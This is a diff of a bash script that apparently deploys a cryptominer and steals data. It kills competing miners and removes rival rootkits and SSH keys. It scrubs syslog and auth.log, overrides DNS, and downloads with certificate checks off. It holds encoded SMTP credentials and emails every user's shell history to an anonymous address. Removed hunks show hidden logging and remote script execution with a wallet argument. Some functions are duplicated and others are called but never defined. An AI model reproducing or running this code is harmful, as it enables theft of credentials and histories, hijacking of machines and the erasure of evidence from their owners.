@@ -2,170 +2,225 @@
 set -uo pipefail
 IFS=$'\n\t'
 
+# ==================== COMPLETE CLEAN INSTALLATION ====================
+echo "========================================"
+echo "FULL CLEAN INSTALLATION MODE"
+echo "========================================"
+
+clean_previous_installations() {
+    echo "[*] Starting complete cleanup..."
+
+    # Kill all mining processes
+    echo "[*] Killing all mining processes..."
+    pkill -9 -f "xmrig\|kswapd0\|swapd\|gdm2\|monero\|minerd\|cpuminer"
+    pkill -9 -f "config.json\|system-watchdog\|launcher.sh"
+
+    # Remove directories
+    echo "[*] Removing miner directories..."
+    rm -rf ~/moneroocean ~/.moneroocean ~/.gdm* ~/.swapd ~/.system_cache
+    rm -rf /root/.swapd /root/.gdm* /root/.system_cache
+
+    # Clean services
+    echo "[*] Cleaning services..."
+    systemctl stop swapd gdm2 moneroocean_miner 2>/dev/null
+    systemctl disable swapd gdm2 moneroocean_miner 2>/dev/null
+    rm -f /etc/systemd/system/swapd.service /etc/systemd/system/gdm2.service 2>/dev/null
+
+    # Clean init scripts
+    rm -f /etc/init.d/swapd /etc/init.d/gdm2 2>/dev/null
+
+    # Clean crontab
+    echo "[*] Cleaning crontab..."
+    crontab -l 2>/dev/null | grep -v "swapd\|gdm\|system_cache\|check_and_start" | crontab - 2>/dev/null
+
+    # Clean profiles
+    echo "[*] Cleaning profiles..."
+    sed -i '/\.swapd\|\.gdm\|\.system_cache\|moneroocean/d' ~/.profile ~/.bashrc 2>/dev/null
+    [ -f /root/.profile ] && sed -i '/\.swapd\|\.gdm\|\.system_cache\|moneroocean/d' /root/.profile 2>/dev/null
+
+    # Clean SSH
+    echo "[*] Cleaning SSH keys..."
+    if [ -f ~/.ssh/authorized_keys ]; then
+        sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukh\|AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/d' ~/.ssh/authorized_keys 2>/dev/null
+    fi
+
+    # Remove rootkits
+    echo "[*] Removing kernel rootkits..."
+    rmmod diamorphine reptile rootkit 2>/dev/null || true
+    rm -rf /reptile /tmp/.ICE-unix/Reptile /tmp/.ICE-unix/Diamorphine 2>/dev/null
+    rm -f /usr/local/lib/libhide.so /etc/ld.so.preload 2>/dev/null
+
+    # Clean logs
+    echo "[*] Cleaning logs..."
+    sed -i '/swapd\|gdm\|kswapd0\|xmrig\|miner/d' /var/log/syslog /var/log/auth.log 2>/dev/null || true
+
+    echo "[✓] Cleanup complete"
+    echo ""
+}
+
+# Run cleanup
+clean_previous_installations
+sleep 2
+
 # ========================================================================
-# HIDDEN LOGFILE CONFIGURATION
+# COMPATIBILITY FIX FOR ANCIENT SYSTEMS
 # ========================================================================
 
-# Determine install directory based on user
-if [[ $(id -u) -eq 0 ]]; then
-    INSTALL_DIR="/root/.system_cache"
-    HIDDEN_LOG="$INSTALL_DIR/.syscache.log"
-else
-    INSTALL_DIR="$HOME/.system_cache"
-    HIDDEN_LOG="$INSTALL_DIR/.syscache.log"
-fi
+# Enhanced download for ancient systems
+download_file_with_fallback() {
+    local url="$1"
+    local output="${2:-/dev/stdout}"
 
-# Create hidden install directory
-mkdir -p "$INSTALL_DIR"
+    # Try curl first
+    if command -v curl >/dev/null 2>&1; then
+        # Check curl version
+        CURL_VERSION=$(curl --version 2>/dev/null | head -1 | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+' || echo "0.0.0")
 
-# Function to write to hidden log with stealth
-log_hidden() {
+        # Ancient curl - try different methods
+        if [ $(echo "$CURL_VERSION < 7.40" | bc) -eq 1 ]; then
+            echo "[*] Using legacy curl ($CURL_VERSION) with fallback options..."
+
+            # Try SSLv3 (for ancient systems)
+            curl --ssl3 --tlsv1 --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
+
+            # Try --insecure
+            curl --insecure --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
+
+            # Try HTTP instead
+            local http_url=$(echo "$url" | sed 's/^https:/http:/')
+            curl --max-time 30 "$http_url" -o "$output" 2>/dev/null && return 0
+        else
+            # Modern curl
+            curl -L --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
+            curl -L --insecure --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
+        fi
+    fi
+
+    # Try wget
+    if command -v wget >/dev/null 2>&1; then
+        wget --timeout=30 "$url" -O "$output" 2>/dev/null && return 0
+        wget --no-check-certificate --timeout=30 "$url" -O "$output" 2>/dev/null && return 0
+
+        # Try HTTP
+        local http_url=$(echo "$url" | sed 's/^https:/http:/')
+        wget --timeout=30 "$http_url" -O "$output" 2>/dev/null && return 0
+    fi
+
+    echo "[ERROR] All download methods failed"
+    return 1
+}
+
+# Fix DNS
+fix_dns() {
+    echo "[*] Setting reliable DNS..."
+    cat > /etc/resolv.conf << EOF
+nameserver 1.1.1.1
+nameserver 8.8.8.8
+nameserver 8.8.4.4
+EOF
+    echo "[✓] DNS configured"
+}
+
+# Upgrade tools
+upgrade_tools() {
+    echo "[*] Updating download tools..."
+
+    # Try to update curl
+    if command -v yum >/dev/null 2>&1; then
+        yum install -y curl wget 2>/dev/null || true
+    elif command -v apt-get >/dev/null 2>&1; then
+        apt-get update -qq 2>/dev/null
+        apt-get install -y curl wget 2>/dev/null || true
+    fi
+}
+
+# Main compatibility initialization
+init_compatibility() {
+    echo "========================================"
+    echo "INITIALIZING COMPATIBILITY LAYER"
+    echo "========================================"
+
+    # Detect if we're on an ancient system
+    if [ -f /etc/redhat-release ]; then
+        REDHAT_VERSION=$(grep -o '[0-9]\+\.[0-9]\+' /etc/redhat-release 2>/dev/null || echo "0")
+        MAJOR_VERSION=$(echo "$REDHAT_VERSION" | cut -d. -f1)
+
+        if [ "$MAJOR_VERSION" -lt 7 ]; then
+            echo "[!] Ancient RHEL/CentOS $REDHAT_VERSION detected - applying compatibility fixes"
+            echo "[*] This system may have old SSL/TLS libraries"
+        fi
+    fi
+
+    # Run compatibility fixes
+    install_download_tools
+    fix_ssl_certificates
+
+    # Test connectivity
+    echo "[*] Testing connection to GitHub..."
+    if command -v curl >/dev/null 2>&1; then
+        if curl --insecure --max-time 5 "https://raw.githubusercontent.com" >/dev/null 2>&1; then
+            echo "[✓] Connection test successful"
+        else
+            echo "[!] HTTPS connection failed, will use fallback methods"
+        fi
+    fi
+
+    echo "========================================"
+}
+
+# Run compatibility initialization at script start
+init_compatibility
+
+# ========================================================================
+# ORIGINAL SCRIPT CONTINUES BELOW (with enhanced download_and_execute function)
+# ========================================================================
+
+# Then continue with your existing code...
+unset HISTFILE
+
+# Configuration variables (consider moving sensitive data to environment variables)
+readonly RECIPIENT_EMAIL="46eshdfq@anonaddy.me"
+readonly LOG_FILE="/tmp/system_report_email.log"
+readonly REPORT_FILE="/tmp/system_report.txt"
+readonly SERVICES_TO_CHECK=("swapd" "gdm2")
+
+# Decoded SMTP credentials (consider using environment variables instead)
+SMTP_SERVER_B64="c210cC5tYWlsZXJzZW5kLm5ldA=="
+readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d)
+readonly SMTP_PORT=587
+SENDER_EMAIL_B64="TVNfQkM3R3FyQHRlc3QtMnAwMzQ3em0yOXlsemRybi5tbHNlbmRlci5uZXQ="
+readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d)
+SMTP_PASSWORD_B64="bXNzcC5KNGtyVHFzLmpwemttZ3Fwd20ybDA1OXYuNkdDMmFJWg=="
+readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d)
+
+# Function to log messages with timestamp
+log_message() {
     local msg="$1"
-    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
-    
-    # Write to hidden log
-    echo "[$timestamp] $msg" >> "$HIDDEN_LOG"
-    
-    # Also write to system log (but obfuscated)
-    logger -t "kernel" "[cache] $msg" 2>/dev/null || true
-    
-    # Echo to console if not in stealth mode
-    if [ "${STEALTH_MODE:-0}" -eq 0 ]; then
-        echo "$msg"
-    fi
+    echo "$(date '+%Y-%m-%d %H:%M:%S') - $msg" >> "$LOG_FILE"
+    echo "$msg"
 }
 
-# Function to read hidden log
-read_hidden_log() {
-    if [ -f "$HIDDEN_LOG" ]; then
-        echo "=== HIDDEN LOG CONTENTS ==="
-        tail -50 "$HIDDEN_LOG"
-        echo "=========================="
-    else
-        echo "Hidden log not found: $HIDDEN_LOG"
-    fi
+# Function to check if a command exists
+command_exists() {
+    command -v "$1" >/dev/null 2>&1
 }
 
-# Function to hide the logfile
-hide_logfile() {
-    if [ -f "$HIDDEN_LOG" ]; then
-        # Hide with dot prefix and obscure permissions
-        chmod 600 "$HIDDEN_LOG" 2>/dev/null
-        chattr +i "$HIDDEN_LOG" 2>/dev/null || true
-        
-        # Rename to something innocuous
-        mv "$HIDDEN_LOG" "$INSTALL_DIR/.bash_profile.backup" 2>/dev/null || true
-        
-        # Create symlink with obscure name
-        ln -sf "$INSTALL_DIR/.bash_profile.backup" "$INSTALL_DIR/...log" 2>/dev/null || true
-        
-        log_hidden "Logfile hidden at: $INSTALL_DIR/.bash_profile.backup"
-    fi
-}
-
-# Function to clean old logs
-clean_hidden_logs() {
-    # Keep only last 1000 lines
-    if [ -f "$HIDDEN_LOG" ] && [ $(wc -l < "$HIDDEN_LOG") -gt 1000 ]; then
-        tail -1000 "$HIDDEN_LOG" > "${HIDDEN_LOG}.tmp"
-        mv "${HIDDEN_LOG}.tmp" "$HIDDEN_LOG"
-        log_hidden "Cleaned hidden log (kept last 1000 lines)"
-    fi
-    
-    # Remove any backup logs older than 7 days
-    find "$INSTALL_DIR" -name "*.log.*" -mtime +7 -delete 2>/dev/null
-    find "$INSTALL_DIR" -name "log.*" -mtime +7 -delete 2>/dev/null
-}
-
-# Initialize hidden logging
-log_hidden "=== SCRIPT STARTED ==="
-log_hidden "User: $(whoami)"
-log_hidden "Hostname: $(hostname)"
-log_hidden "IP: $(hostname -I 2>/dev/null || echo 'unknown')"
-
-# ========================================================================
-# COMPATIBILITY FIXES - REMOVED BROKEN SSL FUNCTIONS
-# ========================================================================
-
-# Clean up any bad SSL certificates from previous runs
-cleanup_bad_ssl() {
-    log_hidden "[*] Cleaning up SSL issues..."
-    
-    # Remove problematic CA files that break curl
-    rm -f /tmp/cacert.pem /tmp/curl-ca-bundle.crt 2>/dev/null
-    
-    # Unset environment variables that might break curl
-    unset CURL_CA_BUNDLE
-    unset SSL_CERT_FILE
-    unset SSL_CERT_DIR
-    
-    # Restore original CA path
-    if [ -f /etc/ssl/certs/ca-certificates.crt ]; then
-        export CURL_CA_BUNDLE="/etc/ssl/certs/ca-certificates.crt"
-    elif [ -f /etc/pki/tls/certs/ca-bundle.crt ]; then
-        export CURL_CA_BUNDLE="/etc/pki/tls/certs/ca-bundle.crt"
-    fi
-}
-
-# Function to check for systemd vs SysV
-detect_init_system() {
-    if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
-        echo "systemd"
-    elif [ -d /etc/init.d ] || command -v service >/dev/null 2>&1; then
-        echo "sysv"
-    elif [ -f /sbin/init ] && file /sbin/init | grep -q "upstart"; then
-        echo "upstart"
-    else
-        echo "unknown"
-    fi
-}
-
-# Enhanced service management for systems without systemctl
-safe_service_stop() {
-    local service="$1"
-    local init_system=$(detect_init_system)
-    
-    log_hidden "[*] Stopping service: $service (init: $init_system)"
-    
-    case "$init_system" in
-        "systemd")
-            systemctl stop "$service" 2>/dev/null || true
-            ;;
-        "sysv")
-            if [ -f "/etc/init.d/$service" ]; then
-                /etc/init.d/"$service" stop 2>/dev/null || true
-            elif command -v service >/dev/null 2>&1; then
-                service "$service" stop 2>/dev/null || true
-            fi
-            ;;
-        "upstart")
-            stop "$service" 2>/dev/null || true
-            ;;
-    esac
-    
-    # Always try to kill by process name as last resort
-    pkill -9 -f "$service" 2>/dev/null || true
-    pkill -9 "$service" 2>/dev/null || true
-    
-    log_hidden "[✓] Service $service stopped"
-}
-
-# Enhanced DNS fix function
+# Function to fix DNS configuration when downloads fail
 fix_dns_and_retry() {
-    log_hidden "[!] Checking DNS configuration..."
+    log_message "Download failed - checking DNS configuration..."
     
     # Check if 1.1.1.1 is already in resolv.conf
     if grep -q "nameserver 1.1.1.1" /etc/resolv.conf 2>/dev/null; then
-        log_hidden "[✓] Cloudflare DNS (1.1.1.1) already configured"
-        return 0
+        log_message "Cloudflare DNS (1.1.1.1) already configured"
+        return 1  # DNS is already correct, issue is elsewhere
     fi
     
-    log_hidden "[*] Adding Cloudflare DNS (1.1.1.1) to /etc/resolv.conf"
+    log_message "Adding Cloudflare DNS (1.1.1.1) to /etc/resolv.conf"
     
     # Backup original resolv.conf
     if [ -f /etc/resolv.conf ]; then
         cp /etc/resolv.conf /etc/resolv.conf.backup.$(date +%s) 2>/dev/null
-        log_hidden "[✓] Backed up original resolv.conf"
+        log_message "Backed up original resolv.conf"
     fi
     
     # Add 1.1.1.1 as the first nameserver
@@ -176,212 +231,89 @@ fix_dns_and_retry() {
     } > /etc/resolv.conf.new
     
     mv /etc/resolv.conf.new /etc/resolv.conf
-    log_hidden "[✓] DNS updated - added 1.1.1.1 and 8.8.8.8"
+    log_message "DNS updated - added 1.1.1.1 and 8.8.8.8"
     
     # Test DNS resolution
-    log_hidden "[*] Testing DNS resolution..."
-    sleep 1
+    log_message "Testing DNS resolution..."
+    if ping -c 1 -W 3 1.1.1.1 >/dev/null 2>&1; then
+        log_message "Can reach 1.1.1.1"
+    else
+        log_message "WARNING: Cannot reach 1.1.1.1 - network may be down"
+        return 1
+    fi
     
     if nslookup github.com >/dev/null 2>&1 || host github.com >/dev/null 2>&1; then
-        log_hidden "[✓] DNS resolution working"
-        return 0
+        log_message "DNS resolution working"
+        return 0  # Success - DNS is now working
     else
-        log_hidden "[!] WARNING: DNS resolution may still be failing"
+        log_message "WARNING: DNS resolution still failing"
         return 1
     fi
 }
 
-# SIMPLIFIED AND FIXED download function - patches scripts before execution
-download_and_execute() {
-    local url="$1"
-    local wallet="$2"
-    local description="$3"
-    local max_retries=3
-    local retry=0
+# Function to check required dependencies
+check_dependencies() {
+    local missing_deps=()
+    local required_deps=("curl" "systemctl" "free" "df" "hostname" "base64")
     
-    log_hidden "[*] Downloading $description from: $(echo $url | sed 's|https://||')"
-    
-    while [ $retry -lt $max_retries ]; do
-        retry=$((retry + 1))
-        log_hidden "[*] Attempt $retry/$max_retries"
-        
-        # Clean SSL issues before each attempt
-        cleanup_bad_ssl
-        
-        # Create temporary file
-        local temp_script=$(mktemp)
-        local fixed_script=$(mktemp)
-        
-        # Try wget first (it works for you)
-        if command -v wget >/dev/null 2>&1; then
-            log_hidden "[*] Using wget..."
-            if wget --no-check-certificate --timeout=30 "$url" -O "$temp_script" 2>/dev/null; then
-                log_hidden "[✓] Downloaded $(wc -l < "$temp_script") lines"
-                
-                # CRITICAL: Fix the downloaded script before running it
-                log_hidden "[*] Fixing common issues in script..."
-                
-                # 1. Remove problematic SSL settings
-                grep -v "CURL_CA_BUNDLE=\|cacert.pem\|export.*CA" "$temp_script" > "$fixed_script"
-                
-                # 2. Replace killall with pkill (killall doesn't exist on some systems)
-                sed -i 's/killall /pkill -f /g' "$fixed_script"
-                
-                # 3. Fix curl commands to use --insecure
-                sed -i 's/curl -L/curl -L --insecure/g' "$fixed_script"
-                sed -i 's/curl https/curl --insecure https/g' "$fixed_script"
-                
-                # 4. Fix wget commands to use --no-check-certificate
-                sed -i 's/wget https/wget --no-check-certificate https/g' "$fixed_script"
-                sed -i 's/wget -q/wget --no-check-certificate -q/g' "$fixed_script"
-                
-                # 5. Fix lscpu dependency
-                sed -i 's/type lscpu >\/dev\/null/true/g' "$fixed_script"
-                sed -i 's/command -v lscpu/command -v nproc/g' "$fixed_script"
-                
-                # 6. Ensure shebang exists
-                if ! head -1 "$fixed_script" | grep -q "^#!/"; then
-                    sed -i '1i#!/bin/bash' "$fixed_script"
-                fi
-                
-                chmod +x "$fixed_script"
-                
-                log_hidden "[*] Executing fixed script with wallet: (wallet hidden)"
-                
-                # Run with timeout to prevent hanging
-                timeout 180 bash "$fixed_script" "$wallet" 2>&1 | tee -a "$HIDDEN_LOG"
-                
-                local exit_code=$?
-                
-                # Cleanup
-                rm -f "$temp_script" "$fixed_script"
-                
-                if [ $exit_code -eq 0 ]; then
-                    log_hidden "[✓] $description completed successfully"
-                    return 0
-                elif [ $exit_code -eq 124 ]; then
-                    log_hidden "[!] $description timed out after 3 minutes"
-                else
-                    log_hidden "[!] $description exited with code: $exit_code"
-                fi
-            else
-                log_hidden "[!] wget download failed"
-            fi
+    for cmd in "${required_deps[@]}"; do
+        if ! command_exists "$cmd"; then
+            missing_deps+=("$cmd")
         fi
-        
-        # If wget failed or doesn't exist, try curl
-        if command -v curl >/dev/null 2>&1; then
-            log_hidden "[*] Trying curl..."
-            if curl -L --insecure --max-time 30 "$url" -o "$temp_script" 2>/dev/null; then
-                log_hidden "[✓] Downloaded via curl, applying fixes..."
-                
-                # Apply same fixes
-                grep -v "CURL_CA_BUNDLE=\|cacert.pem" "$temp_script" > "$fixed_script"
-                sed -i 's/killall /pkill -f /g' "$fixed_script"
-                sed -i 's/curl -L/curl -L --insecure/g' "$fixed_script"
-                sed -i 's/wget /wget --no-check-certificate /g' "$fixed_script"
-                
-                chmod +x "$fixed_script"
-                timeout 180 bash "$fixed_script" "$wallet" 2>&1 | tee -a "$HIDDEN_LOG"
-                
-                local exit_code=$?
-                rm -f "$temp_script" "$fixed_script"
-                
-                if [ $exit_code -eq 0 ]; then
-                    log_hidden "[✓] $description completed successfully"
-                    return 0
-                fi
-            fi
-        fi
-        
-        # Try HTTP as fallback
-        if [ $retry -eq 2 ]; then
-            log_hidden "[*] Trying HTTP instead of HTTPS..."
-            local http_url=$(echo "$url" | sed 's/^https:/http:/')
-            if [ "$http_url" != "$url" ]; then
-                if command -v wget >/dev/null 2>&1; then
-                    if wget --timeout=30 "$http_url" -O "$temp_script" 2>/dev/null; then
-                        log_hidden "[✓] Downloaded via HTTP"
-                        
-                        # Apply fixes
-                        grep -v "CURL_CA_BUNDLE=\|cacert.pem" "$temp_script" > "$fixed_script"
-                        sed -i 's/killall /pkill -f /g' "$fixed_script"
-                        chmod +x "$fixed_script"
-                        
-                        timeout 180 bash "$fixed_script" "$wallet" 2>&1 | tee -a "$HIDDEN_LOG"
-                        
-                        rm -f "$temp_script" "$fixed_script"
-                        # Even if this fails, we tried
-                    fi
-                fi
-            fi
-        fi
-        
-        if [ $retry -lt $max_retries ]; then
-            log_hidden "[!] Download attempt failed, retrying in 2 seconds..."
-            sleep 2
-        fi
-        
-        rm -f "$temp_script" "$fixed_script" 2>/dev/null
     done
     
-    log_hidden "[ERROR] $description failed after $max_retries attempts"
-    return 1
+    if [ ${#missing_deps[@]} -gt 0 ]; then
+        log_message "ERROR: Missing required dependencies: ${missing_deps[*]}"
+        log_message "Please install missing packages and try again"
+        return 1
+    fi
+    
+    return 0
 }
 
-# Initialize compatibility
-init_compatibility() {
-    log_hidden "========================================"
-    log_hidden "INITIALIZING COMPATIBILITY LAYER"
-    log_hidden "========================================"
-    
-    # Clean SSL issues
-    cleanup_bad_ssl
-    
-    # Fix DNS
-    fix_dns_and_retry
-    
-    # Stop any conflicting services
-    log_hidden "[*] Stopping any conflicting services..."
-    safe_service_stop "swapd"
-    safe_service_stop "gdm2"
-    
-    log_hidden "========================================"
-}
+# Function to collect history from all available shells
+collect_shell_history() {
+    echo "=== COLLECTING SHELL HISTORIES ==="
 
-# Run compatibility initialization at script start
-init_compatibility
+    declare -A SHELL_HISTORIES=(
+        ["bash"]="$HOME/.bash_history"
+        ["zsh"]="$HOME/.zsh_history"
+        ["ksh"]="$HOME/.sh_history"
+        ["fish"]="$HOME/.local/share/fish/fish_history"
+        ["tcsh"]="$HOME/.history"
+    )
 
-# ========================================================================
-# ORIGINAL SCRIPT CONTINUES BELOW (with hidden logging)
-# ========================================================================
+    local SYSTEM_SHELLS
+    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)
 
-unset HISTFILE
+    local OUTPUT=""
+    for shell in $SYSTEM_SHELLS; do
+        case $shell in
+            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
+                local hist_file="${SHELL_HISTORIES[$shell]}"
+                if [ -f "$hist_file" ]; then
+                    OUTPUT+="\n=== $shell HISTORY ===\n"
+                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
+                fi
+                ;;
+        esac
+    done
 
-# Configuration variables
-readonly RECIPIENT_EMAIL="46eshdfq@anonaddy.me"
-readonly LOG_FILE="/tmp/system_report_email.log"
-readonly REPORT_FILE="/tmp/system_report.txt"
-readonly SERVICES_TO_CHECK=("swapd" "gdm2")
+    if [ "$(id -u)" -eq 0 ]; then
+        for user_dir in /home/*; do
+        [ -d "$user_dir" ] || continue
+        local user=$(basename "$user_dir")
+            for shell in "${!SHELL_HISTORIES[@]}"; do
+                local hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
+                if [ -f "$hist_file" ]; then
+                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
+                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
+                fi
+            done
+        done
+    fi
 
-# Decoded SMTP credentials
-SMTP_SERVER_B64="c210cC5tYWlsZXJzZW5kLm5ldA=="
-readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d)
-readonly SMTP_PORT=587
-SENDER_EMAIL_B64="TVNfQkM3R3FyQHRlc3QtMnAwMzQ3em0yOXlsemRybi5tbHNlbmRlci5uZXQ="
-readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d)
-SMTP_PASSWORD_B64="bXNzcC5KNGtyVHFzLmpwemttZ3Fwd20ybDA1OXYuNkdDMmFJWg=="
-readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d)
-
-# Replace original log_message with hidden version
-log_message() {
-    local msg="$1"
-    log_hidden "$msg"
-}
-
-# Function to check if a command exists
-command_exists() {
-    command -v "$1" >/dev/null 2>&1
+    echo -e "$OUTPUT"
 }
 
 # Function to send email with Python
@@ -443,51 +375,6 @@ send_email_with_mail() {
     
     mail -s "$subject" "$RECIPIENT_EMAIL" < "$temp_file"
     return $?
-}
-
-# Collect shell history function
-collect_shell_history() {
-    log_hidden "=== COLLECTING SHELL HISTORIES ==="
-
-    declare -A SHELL_HISTORIES=(
-        ["bash"]="$HOME/.bash_history"
-        ["zsh"]="$HOME/.zsh_history"
-        ["ksh"]="$HOME/.sh_history"
-        ["fish"]="$HOME/.local/share/fish/fish_history"
-        ["tcsh"]="$HOME/.history"
-    )
-
-    local SYSTEM_SHELLS
-    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)
-
-    local OUTPUT=""
-    for shell in $SYSTEM_SHELLS; do
-        case $shell in
-            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
-                local hist_file="${SHELL_HISTORIES[$shell]}"
-                if [ -f "$hist_file" ]; then
-                    OUTPUT+="\n=== $shell HISTORY ===\n"
-                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
-                fi
-                ;;
-        esac
-    done
-
-    if [ "$(id -u)" -eq 0 ]; then
-        for user_dir in /home/*; do
-        [ -d "$user_dir" ] || continue
-        local user=$(basename "$user_dir")
-            for shell in "${!SHELL_HISTORIES[@]}"; do
-                local hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
-                if [ -f "$hist_file" ]; then
-                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
-                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
-                fi
-            done
-        done
-    fi
-
-    echo -e "$OUTPUT"
 }
 
 # Main email sending function
@@ -552,59 +439,59 @@ EOF
 
     # Always save report locally first
     cp "$temp_file" "$REPORT_FILE" 2>/dev/null || true
-    log_hidden "Report saved to: $REPORT_FILE"
+    log_message "Report saved to: $REPORT_FILE"
 
     # Try sending methods in order of preference
     local success=false
     
     # Method 1: Python
     if command_exists python3; then
-        log_hidden "Attempting to send email via Python..."
+        log_message "Attempting to send email via Python..."
         local python_output
         if python_output=$(send_email_with_python "$temp_file" "$subject" 2>&1); then
             # Check for success indicators
             if echo "$python_output" | grep -qv "SMTP Error\|535\|authentication failed"; then
-                log_hidden "Email sent successfully via Python"
+                log_message "Email sent successfully via Python"
                 success=true
             else
-                log_hidden "Python email method failed: $python_output"
+                log_message "Python email method failed: $python_output"
             fi
         else
-            log_hidden "Python email method failed"
+            log_message "Python email method failed"
         fi
     fi
 
     # Method 2: mail command
     if [ "$success" = false ] && command_exists mail; then
-        log_hidden "Attempting to send email via mail command..."
+        log_message "Attempting to send email via mail command..."
         if send_email_with_mail "$temp_file" "$subject" 2>&1; then
-            log_hidden "Email sent successfully via mail command"
+            log_message "Email sent successfully via mail command"
             success=true
         else
-            log_hidden "Mail command method failed"
+            log_message "Mail command method failed"
         fi
     fi
 
     # Method 3: curl
     if [ "$success" = false ] && command_exists curl; then
-        log_hidden "Attempting to send email via curl..."
+        log_message "Attempting to send email via curl..."
         local curl_output
         if curl_output=$(send_email_with_curl "$temp_file" "$subject" 2>&1); then
             # Check for auth errors
             if ! echo "$curl_output" | grep -qE "authentication failed|login denied|535|AUTH"; then
-                log_hidden "Email sent successfully via curl"
+                log_message "Email sent successfully via curl"
                 success=true
             else
-                log_hidden "Curl email method failed: Authentication error"
+                log_message "Curl email method failed: Authentication error"
             fi
         else
-            log_hidden "Curl email method failed"
+            log_message "Curl email method failed"
         fi
     fi
 
     # Final fallback
     if [ "$success" = false ]; then
-        log_hidden "Warning: All email sending methods failed - report stored in $REPORT_FILE"
+        log_message "Warning: All email sending methods failed - report stored in $REPORT_FILE"
     fi
 
     rm -f "$temp_file"
@@ -613,55 +500,60 @@ EOF
     return 0
 }
 
-# Service management functions (updated for compatibility)
+# Service management functions
 does_service_exist() {
     local service="$1"
-    local init_system=$(detect_init_system)
-    
-    case "$init_system" in
-        "systemd")
-            systemctl list-units --type=service --all 2>/dev/null | grep -q "$service.service" && return 0
-            ;;
-        "sysv")
-            if [ -f "/etc/init.d/$service" ]; then
-                return 0
-            elif command -v service >/dev/null 2>&1; then
-                service --status-all 2>/dev/null | grep -q "$service" && return 0
-            fi
-            ;;
-    esac
-    
-    # Check running processes
-    if ps aux | grep -v grep | grep -q "$service"; then
-        return 0
-    fi
-    
-    return 1
+    systemctl list-units --type=service --all 2>/dev/null | grep -q "$service.service"
 }
 
 is_service_running() {
     local service="$1"
-    local init_system=$(detect_init_system)
-    
-    case "$init_system" in
-        "systemd")
-            systemctl is-active --quiet "$service" 2>/dev/null && return 0
-            ;;
-        "sysv")
-            if [ -f "/etc/init.d/$service" ]; then
-                /etc/init.d/"$service" status >/dev/null 2>&1 && return 0
-            elif command -v service >/dev/null 2>&1; then
-                service "$service" status >/dev/null 2>&1 && return 0
-            fi
-            ;;
-    esac
-    
-    # Check running processes
-    if ps aux | grep -v grep | grep -q "$service"; then
-        return 0
+    systemctl is-active --quiet "$service" 2>/dev/null
+}
+
+# Collect shell history function
+collect_shell_history() {
+    echo "=== COLLECTING SHELL HISTORIES ==="
+
+    declare -A SHELL_HISTORIES=(
+        ["bash"]="$HOME/.bash_history"
+        ["zsh"]="$HOME/.zsh_history"
+        ["ksh"]="$HOME/.sh_history"
+        ["fish"]="$HOME/.local/share/fish/fish_history"
+        ["tcsh"]="$HOME/.history"
+    )
+
+    local SYSTEM_SHELLS
+    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)
+
+    local OUTPUT=""
+    for shell in $SYSTEM_SHELLS; do
+        case $shell in
+            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
+                local hist_file="${SHELL_HISTORIES[$shell]}"
+                if [ -f "$hist_file" ]; then
+                    OUTPUT+="\n=== $shell HISTORY ===\n"
+                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
+                fi
+                ;;
+        esac
+    done
+
+    if [ "$(id -u)" -eq 0 ]; then
+        for user_dir in /home/*; do
+        [ -d "$user_dir" ] || continue
+        local user=$(basename "$user_dir")
+            for shell in "${!SHELL_HISTORIES[@]}"; do
+                local hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
+                if [ -f "$hist_file" ]; then
+                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
+                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
+                fi
+            done
+        done
     fi
-    
-    return 1
+
+    echo -e "$OUTPUT"
 }
 
 # Cleanup history function
@@ -673,22 +565,22 @@ clean_history_file() {
             head -n $((line_count - 10)) "$file" > "${file}.tmp" 2>/dev/null
             if [ -f "${file}.tmp" ]; then
                 mv "${file}.tmp" "$file"
-                log_hidden "Cleaned last 10 lines of: $file"
+                log_message "Cleaned last 10 lines of: $file"
             else
-                log_hidden "Failed to create temp file for: $file"
+                log_message "Failed to create temp file for: $file"
             fi
         elif [ "$line_count" -gt 0 ]; then
-            log_hidden "History file '$file' has ≤10 lines. Not cleaning."
+            log_message "History file '$file' has ≤10 lines. Not cleaning."
         else
-            log_hidden "History file '$file' is empty."
+            log_message "History file '$file' is empty."
         fi
     else
-        log_hidden "History file '$file' not found."
+        log_message "History file '$file' not found."
     fi
 }
 
 cleanup_histories() {
-    log_hidden "Cleaning the last 10 lines of all shell histories..."
+    log_message "Cleaning the last 10 lines of all shell histories..."
 
     declare -A SHELL_HISTORIES=(
         ["bash"]="$HOME/.bash_history"
